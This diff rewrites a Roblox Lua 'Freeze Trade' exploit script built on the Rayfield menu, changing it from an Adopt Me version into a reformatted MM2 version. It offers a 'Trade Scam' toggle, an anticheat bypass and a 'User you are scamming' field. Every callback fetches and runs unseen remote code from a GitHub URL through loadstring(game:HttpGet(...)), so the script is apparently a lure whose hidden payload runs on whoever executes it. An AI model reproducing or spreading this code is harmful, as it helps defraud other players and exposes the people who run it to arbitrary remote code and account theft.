@@ -1,1 +1,79 @@
-local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))() -- Create the UI Window local Window = Rayfield:CreateWindow({ Name = "🔥 AdoptMe Freeze Trade 🔥", LoadingTitle = "Loading Rayfield...", LoadingSubtitle = "By DHubOnTop", ConfigurationSaving = { Enabled = true, FolderName = "MyScriptData", -- Save settings in this folder FileName = "UserSettings" }, Discord = { Enabled = true, -- Set to true if you want Discord integration Invite = "https://discord.gg/AuDgVbRa4S", -- Your Discord invite link RememberJoins = true }, KeySystem = true, -- Set to true if you want a key system KeySettings = { Title = "Script Key System", Subtitle = "Enter your key below", Note = "Find the key in our Discord", FileName = "KeyData", SaveKey = false, GrabKeyFromSite = false, Key = {"DHubOnTop"} } }) -- Create a Main Tab local MainTab = Window:CreateTab("Main", 4483362458) -- The number is an asset ID for an icon -- Create a Button local Button = MainTab:CreateButton({ Name = "Bypass Anticheat(Wait 5 min to bypass)", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Universal/refs/heads/main/AdoptMe'))() end }) -- Create a Toggle local Toggle = MainTab:CreateToggle({ Name = "Trade Scam", CurrentValue = false, Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Universal/refs/heads/main/AdoptMe'))() end }) -- Create an Input Box local Input = MainTab:CreateInput({ Name = "User you are scamming", PlaceholderText = "Type here...", RemoveTextAfterFocusLost = false, Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Universal/refs/heads/main/AdoptMe'))() end }) -- Create a Label local Label = MainTab:CreateLabel("Made with ❤️ by DHubOnTop") -- Notify the User Rayfield:Notify({ Title = "Script Activated", Content = "Made with ❤️ by DHubOnTop", Duration = 5, Image = 4483362458, Actions = { -- Notification Buttons Ignore = { Name = "OK", Callback = function() print("User dismissed notification") end } } })
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+-- Create the UI Window
+local Window = Rayfield:CreateWindow({
+Name = "🔥 MM2 Freeze Trade 🔥",
+LoadingTitle = "Loading Rayfield...",
+LoadingSubtitle = "By DHubOnTop",
+ConfigurationSaving = {
+Enabled = true,
+FolderName = "MyScriptData", -- Save settings in this folder
+FileName = "UserSettings"
+},
+Discord = {
+Enabled = true, -- Set to true if you want Discord integration
+Invite = "https://discord.gg/AuDgVbRa4S", -- Your Discord invite link
+RememberJoins = true
+},
+KeySystem = true, -- Set to true if you want a key system
+KeySettings = {
+Title = "Script Key System",
+Subtitle = "Enter your key below",
+Note = "Find the key in our Discord",
+FileName = "KeyData",
+SaveKey = false,
+GrabKeyFromSite = false,
+Key = {"DHubOnTop"}
+}
+})
+
+-- Create a Main Tab
+local MainTab = Window:CreateTab("Main", 4483362458) -- The number is an asset ID for an icon
+
+-- Create a Button
+local Button = MainTab:CreateButton({
+Name = "Bypass Anticheat(Wait 5 min to bypass)",
+Callback = function()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Universal/refs/heads/main/AdoptMe'))()
+end
+})
+
+-- Create a Toggle
+local Toggle = MainTab:CreateToggle({
+Name = "Trade Scam",
+CurrentValue = false,
+Callback = function()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Universal/refs/heads/main/AdoptMe'))()
+end
+})
+-- Create an Input Box
+local Input = MainTab:CreateInput({
+Name = "User you are scamming",
+PlaceholderText = "Type here...",
+RemoveTextAfterFocusLost = false,
+Callback = function()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Universal/refs/heads/main/AdoptMe'))()
+end
+})
+
+-- Create a Label
+local Label = MainTab:CreateLabel("Made with ❤️ by DHubOnTop")
+
+-- Notify the User
+Rayfield:Notify({
+Title = "Script Activated",
+Content = "Made with ❤️ by DHubOnTop",
+Duration = 5,
+Image = 4483362458,
+Actions = { -- Notification Buttons
+Ignore = {
+Name = "OK",
+Callback = function()
+print("User dismissed notification")
+end
+}
+}
+})
